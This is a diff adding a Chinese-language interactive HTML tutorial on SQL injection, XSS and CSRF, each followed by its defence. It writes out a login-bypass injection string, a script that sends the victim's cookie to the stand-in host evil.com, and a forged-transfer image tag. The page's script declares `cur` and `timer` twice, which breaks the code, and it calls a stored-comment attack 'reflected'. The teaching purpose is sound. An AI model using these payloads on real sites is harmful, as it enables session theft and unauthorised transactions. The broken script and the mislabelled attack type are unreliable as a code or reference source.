@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web 攻击 - 安全</title>
+<script src="../nav.js"></script>
+<style>
+:root{--bg:#0f172a;--text:#e2e8f0;--dim:#94a3b8;--dim2:#64748b;--accent:#f87171;--ok:#4ade80;--warn:#fbbf24;--err:#f87171;}
+*{box-sizing:border-box;margin:0;padding:0}
+body{min-height:100vh;background:radial-gradient(circle at 20% 0%,rgba(248,113,113,.12),transparent 38%),var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,-apple-system,sans-serif}
+a{color:var(--accent);text-decoration:none}
+.wrap{max-width:1260px;margin:0 auto;padding:40px 32px 80px}
+.breadcrumb{display:flex;align-items:center;gap:8px;font-size:.78rem;color:var(--dim2);margin-bottom:24px}
+.breadcrumb a{color:var(--dim2)}.breadcrumb a:hover{color:var(--text)}
+.page-title{font-size:clamp(1.6rem,3.5vw,2.8rem);letter-spacing:-.04em;margin-bottom:6px;background:linear-gradient(135deg,#f8fafc,var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.subtitle{color:var(--dim);font-size:.95rem;margin-bottom:28px;max-width:640px;line-height:1.75}
+.layout{display:grid;grid-template-columns:240px 1fr;gap:20px}
+.left-panel{border:1px solid rgba(255,255,255,.07);background:rgba(17,24,39,.7);border-radius:18px;padding:18px}
+.left-panel h3{font-size:.72rem;color:var(--dim2);text-transform:uppercase;letter-spacing:.1em;margin-bottom:14px}
+.step-btn{width:100%;text-align:left;border:1px solid transparent;background:none;color:var(--dim);padding:9px 12px;border-radius:10px;cursor:pointer;font-size:.82rem;line-height:1.5;transition:.15s;margin-bottom:4px;display:block}
+.step-btn:hover{border-color:rgba(248,113,113,.3);color:var(--text)}
+.step-btn.active{background:rgba(248,113,113,.1);border-color:rgba(248,113,113,.4);color:var(--text)}
+.step-index{display:inline-block;width:18px;height:18px;border-radius:50%;background:rgba(248,113,113,.15);color:var(--accent);font-size:.68rem;font-weight:700;text-align:center;line-height:18px;margin-right:7px}
+.ctrl{display:flex;gap:8px;margin-top:14px;flex-wrap:wrap}
+.ctrl button{flex:1;border:1px solid rgba(255,255,255,.1);background:rgba(255,255,255,.04);color:var(--dim);border-radius:10px;padding:8px 4px;cursor:pointer;font-size:.76rem;transition:.15s}
+.ctrl button:hover{border-color:var(--accent);color:var(--text)}
+.center-panel{border:1px solid rgba(255,255,255,.07);background:rgba(17,24,39,.7);border-radius:18px;padding:22px;min-height:540px;display:flex;flex-direction:column;gap:14px}
+.step-msg{border-left:3px solid var(--accent);background:rgba(248,113,113,.06);border-radius:0 10px 10px 0;padding:10px 14px;font-size:.86rem;color:var(--text);line-height:1.7}
+/* SQL viz */
+.sql-compare{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.sql-box{border-radius:12px;padding:14px;font-family:monospace;font-size:.75rem;line-height:1.9}
+.sql-box.vuln{border:1px solid rgba(248,113,113,.35);background:rgba(248,113,113,.06)}
+.sql-box.safe{border:1px solid rgba(74,222,128,.35);background:rgba(74,222,128,.06)}
+.sql-box h3{font-family:'Segoe UI',sans-serif;font-size:.74rem;margin-bottom:8px;font-weight:700}
+.sql-box h3.red{color:var(--err)}
+.sql-box h3.green{color:var(--ok)}
+.code-part{color:var(--dim)}
+.user-part{color:var(--err);background:rgba(248,113,113,.12);padding:0 2px;border-radius:2px}
+.safe-part{color:var(--ok);background:rgba(74,222,128,.1);padding:0 2px;border-radius:2px}
+.placeholder{color:#fbbf24;font-weight:600}
+.result-row{margin-top:10px;padding:8px 10px;border-radius:7px;font-size:.73rem}
+.result-row.leak{background:rgba(248,113,113,.1);border:1px solid rgba(248,113,113,.2);color:#fca5a5}
+.result-row.block{background:rgba(74,222,128,.08);border:1px solid rgba(74,222,128,.2);color:#86efac}
+/* Defense note */
+.defense{border:1px solid rgba(74,222,128,.25);background:rgba(74,222,128,.05);border-radius:10px;padding:12px 14px;font-size:.8rem;color:var(--dim);line-height:1.8;margin-top:4px}
+.defense strong{color:var(--ok)}
+/* Section label */
+.slabel{font-size:.72rem;color:var(--dim2);text-transform:uppercase;letter-spacing:.08em;margin-bottom:8px;font-weight:700}
+</style>
+</head>
+<body>
+<main class="wrap">
+  <div class="breadcrumb"><a href="../index.html">首页</a><span>/</span><a href="index.html">安全</a><span>/</span>Web 攻击</div>
+  <h1 class="page-title">Web 攻击</h1>
+  <p class="subtitle">SQL 注入、XSS、CSRF 是最常见的 Web 攻击类型。核心原则：用颜色区分"代码"和"数据"——用户输入永远是数据，不能被当作代码执行。预处理语句、输出编码、SameSite Cookie 分别防御三类攻击。</p>
+
+  <div class="layout">
+    <div class="left-panel">
+      <h3>步骤</h3>
+      <div id="stepList"></div>
+      <div class="ctrl">
+        <button onclick="prev()">← 上一步</button>
+        <button onclick="next()">下一步 →</button>
+        <button onclick="reset()">重置</button>
+        <button id="playBtn" onclick="togglePlay()">▶ 播放</button>
+      </div>
+    </div>
+    <div class="center-panel">
+      <div class="step-msg" id="stepMsg">点击"下一步"观察各类 Web 攻击及防御方法。</div>
+      <div id="vizArea"></div>
+    </div>
+  </div>
+</main>
+<script>
+const STEPS = [
+  {type:'sql-attack',
+   msg:'SQL 注入攻击：用户在登录框输入 `admin\' OR \'1\'=\'1\'  --` 。服务端直接字符串拼接生成 SQL，用户输入（红色）改变了 SQL 结构，WHERE 子句永真，无需密码即可登录。'},
+  {type:'sql-defense',
+   msg:'SQL 注入防御：使用预处理语句（Prepared Statement）。SQL 结构预先编译固定，用户输入只能是参数（占位符 ?），无论输入什么都不能改变 SQL 结构。单引号会被转义为 \'\'。'},
+  {type:'xss',
+   msg:'XSS（跨站脚本攻击）：攻击者在评论中提交 `<script>document.location="evil.com?c="+document.cookie</script>`。若服务端直接将此字符串插入 HTML，浏览器会执行脚本，窃取用户 Cookie。'},
+  {type:'xss-defense',
+   msg:'XSS 防御：输出编码（HTML Encoding）将 < > " \' 转义为 HTML 实体（&lt; &gt; &quot;），浏览器显示为文本而不是执行脚本。CSP（Content-Security-Policy）响应头进一步限制脚本来源。'},
+  {type:'csrf',
+   msg:'CSRF（跨站请求伪造）：用户已登录 bank.com（浏览器保存了 Cookie），攻击者在 evil.com 放置 <img src="bank.com/transfer?to=attacker&amt=1000">，用户访问时浏览器自动携带 Cookie 发起请求。'},
+  {type:'csrf-defense',
+   msg:'CSRF 防御：① SameSite=Strict/Lax Cookie：仅同站请求携带 Cookie，跨站请求不携带。② CSRF Token：服务端在页面中嵌入随机 Token，evil.com 无法读取 Token，无法构造有效请求。③ 验证 Origin/Referer 请求头。'},
+];
+
+let cur = -1, timer = null;
+
+const TEMPLATES = {
+  'sql-attack': `
+    <div class="slabel">SQL 注入攻击场景</div>
+    <div style="margin-bottom:10px">
+      <div style="font-size:.72rem;color:var(--dim2);margin-bottom:4px">用户输入（恶意）：</div>
+      <div style="font-family:monospace;font-size:.8rem;background:rgba(248,113,113,.08);border:1px solid rgba(248,113,113,.2);border-radius:7px;padding:8px 12px;color:var(--err)">username: admin<span style="background:rgba(248,113,113,.2);padding:0 2px">' OR '1'='1' --</span><br>password: （任意）</div>
+    </div>
+    <div class="slabel">拼接后的 SQL（危险）：</div>
+    <div style="font-family:monospace;font-size:.79rem;background:rgba(17,24,39,.8);border:1px solid rgba(248,113,113,.3);border-radius:8px;padding:12px;line-height:2.2">
+      <span style="color:var(--dim)">SELECT * FROM users WHERE username='</span><span style="color:var(--err);background:rgba(248,113,113,.15);padding:1px 3px">admin' OR '1'='1' --</span><span style="color:var(--dim)">' AND password='xxx'</span>
+      <div style="font-size:.68rem;color:var(--err);margin-top:4px">↑ 用户输入破坏了 SQL 结构，-- 注释掉密码校验</div>
+    </div>
+    <div class="result-row leak">⚠ 结果：WHERE 条件永真，返回所有用户，攻击者以 admin 身份登录</div>`,
+  'sql-defense': `
+    <div class="slabel">预处理语句防御</div>
+    <div class="sql-compare">
+      <div class="sql-box vuln">
+        <h3 class="red">❌ 字符串拼接（危险）</h3>
+        <span class="code-part">query = "SELECT * FROM users<br>WHERE username='"</span><br>
+        <span class="user-part">+ userInput +</span><br>
+        <span class="code-part">"' AND password=..."</span>
+        <div class="result-row leak" style="margin-top:8px;font-family:sans-serif">用户输入直接嵌入 SQL 结构</div>
+      </div>
+      <div class="sql-box safe">
+        <h3 class="green">✅ 预处理语句（安全）</h3>
+        <span class="code-part">stmt = db.Prepare(</span><br>
+        <span class="code-part">"SELECT * FROM users<br>WHERE username=</span><span class="placeholder">?</span><span class="code-part"><br>AND password=</span><span class="placeholder">?</span><span class="code-part">")</span><br>
+        <span class="code-part">stmt.Execute(</span><span class="safe-part">username</span><span class="code-part">,</span><span class="safe-part">password</span><span class="code-part">)</span>
+        <div class="result-row block" style="margin-top:8px;font-family:sans-serif">参数永远是数据，不改变 SQL 结构</div>
+      </div>
+    </div>`,
+  'xss': `
+    <div class="slabel">XSS 反射型攻击</div>
+    <div style="margin-bottom:10px">
+      <div style="font-size:.72rem;color:var(--dim2);margin-bottom:4px">攻击者提交评论：</div>
+      <div style="font-family:monospace;font-size:.75rem;background:rgba(248,113,113,.08);border:1px solid rgba(248,113,113,.2);border-radius:7px;padding:8px 12px;color:var(--err)">&lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt;</div>
+    </div>
+    <div style="font-size:.72rem;color:var(--dim2);margin-bottom:4px">服务端直接插入 HTML（危险）：</div>
+    <div style="font-family:monospace;font-size:.75rem;background:rgba(17,24,39,.8);border:1px solid rgba(248,113,113,.3);border-radius:8px;padding:10px;line-height:2">
+      <span style="color:var(--dim)">&lt;div class="comment"&gt;</span><br>
+      &nbsp;&nbsp;<span style="color:var(--err);background:rgba(248,113,113,.12)">&lt;script&gt;...steal cookie...&lt;/script&gt;</span><br>
+      <span style="color:var(--dim)">&lt;/div&gt;</span>
+    </div>
+    <div class="result-row leak">⚠ 浏览器执行脚本，session cookie 被发送到 evil.com</div>`,
+  'xss-defense': `
+    <div class="slabel">XSS 防御：输出编码 + CSP</div>
+    <div style="font-family:monospace;font-size:.75rem;background:rgba(17,24,39,.8);border:1px solid rgba(74,222,128,.25);border-radius:8px;padding:10px;line-height:2;margin-bottom:10px">
+      <span style="color:var(--dim)">&lt;div class="comment"&gt;</span><br>
+      &nbsp;&nbsp;<span style="color:var(--ok)">&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;</span><br>
+      <span style="color:var(--dim)">&lt;/div&gt;</span><br>
+      <span style="color:var(--dim2);font-size:.68rem">↑ HTML 实体编码后，浏览器显示为文本而不执行</span>
+    </div>
+    <div class="defense">
+      <strong>防御手段：</strong><br>
+      ① <strong>输出编码</strong>：<code>&lt;</code>→<code>&amp;lt;</code>，<code>&gt;</code>→<code>&amp;gt;</code>，<code>"</code>→<code>&amp;quot;</code><br>
+      ② <strong>CSP 响应头</strong>：<code>Content-Security-Policy: default-src 'self'</code>，禁止外部脚本<br>
+      ③ <strong>HttpOnly Cookie</strong>：<code>Set-Cookie: session=...; HttpOnly</code>，JS 无法读取<br>
+      ④ <strong>SameSite Cookie</strong>：限制跨站 Cookie 传递
+    </div>`,
+  'csrf': `
+    <div class="slabel">CSRF 攻击场景</div>
+    <div style="display:flex;flex-direction:column;gap:8px">
+      <div style="border:1px solid rgba(255,255,255,.1);border-radius:9px;padding:10px;font-size:.78rem;display:flex;align-items:center;gap:8px;background:rgba(30,41,59,.4)">
+        <span>1️⃣</span> 用户登录了 bank.com，浏览器保存了 <code style="font-size:.72rem">Cookie: session=abc123</code>
+      </div>
+      <div style="border:1px solid rgba(248,113,113,.25);border-radius:9px;padding:10px;font-size:.78rem;display:flex;align-items:flex-start;gap:8px;background:rgba(248,113,113,.05)">
+        <span>2️⃣</span>
+        <div>攻击者在 evil.com 放置：<br>
+          <code style="font-size:.68rem;color:var(--err)">&lt;img src="https://bank.com/transfer?to=attacker&amp;amt=1000"&gt;</code>
+        </div>
+      </div>
+      <div style="border:1px solid rgba(248,113,113,.25);border-radius:9px;padding:10px;font-size:.78rem;background:rgba(248,113,113,.05)">
+        <span>3️⃣</span> 用户访问 evil.com，浏览器<strong>自动携带</strong> bank.com 的 Cookie 发起请求
+      </div>
+    </div>
+    <div class="result-row leak" style="margin-top:8px">⚠ bank.com 认为是合法请求，1000 元转账成功</div>`,
+  'csrf-defense': `
+    <div class="slabel">CSRF 防御</div>
+    <div style="display:flex;flex-direction:column;gap:10px">
+      <div class="defense">
+        <strong>① SameSite Cookie</strong><br>
+        <code>Set-Cookie: session=abc; SameSite=Strict</code><br>
+        跨站请求不携带此 Cookie，evil.com 发起的请求无 session，服务端 401
+      </div>
+      <div class="defense">
+        <strong>② CSRF Token</strong><br>
+        服务端在页面隐藏域中嵌入随机 Token：<br>
+        <code>&lt;input type="hidden" name="csrf_token" value="x8k2q..."&gt;</code><br>
+        evil.com 无法读取该 Token（同源策略），无法构造有效请求
+      </div>
+      <div class="defense">
+        <strong>③ 验证 Origin/Referer 请求头</strong><br>
+        服务端检查请求来源，拒绝非同源请求（evil.com 来的 Origin 不匹配）
+      </div>
+    </div>`,
+};
+
+let timer = null;
+
+function buildStepList(){
+  const list = document.getElementById('stepList');
+  list.innerHTML = '';
+  const labels = ['SQL 注入攻击','SQL 防御','XSS 攻击','XSS 防御','CSRF 攻击','CSRF 防御'];
+  STEPS.forEach((s, i) => {
+    const btn = document.createElement('button');
+    btn.className = 'step-btn' + (i === cur ? ' active' : '');
+    btn.innerHTML = `<span class="step-index">${i+1}</span>${labels[i]}`;
+    btn.onclick = () => { cur = i; renderStep(); };
+    list.appendChild(btn);
+  });
+}
+
+let cur = -1;
+
+function renderStep(){
+  const step = cur >= 0 ? STEPS[cur] : null;
+  document.getElementById('stepMsg').textContent = step ? step.msg : '点击"下一步"观察各类 Web 攻击及防御方法。';
+  document.getElementById('vizArea').innerHTML = step ? (TEMPLATES[step.type]||'') : '';
+  buildStepList();
+}
+
+function next(){ if(cur < STEPS.length-1){ cur++; renderStep(); } }
+function prev(){ if(cur > -1){ cur--; renderStep(); } }
+function reset(){ cur = -1; stopPlay(); renderStep(); }
+function togglePlay(){ if(timer) stopPlay(); else startPlay(); }
+function startPlay(){
+  document.getElementById('playBtn').textContent = '⏸ 暂停';
+  timer = setInterval(() => {
+    if(cur < STEPS.length-1){ cur++; renderStep(); } else stopPlay();
+  }, 2200);
+}
+function stopPlay(){
+  if(timer){ clearInterval(timer); timer = null; }
+  document.getElementById('playBtn').textContent = '▶ 播放';
+}
+
+renderStep();
+</script>
+</body>
+</html>
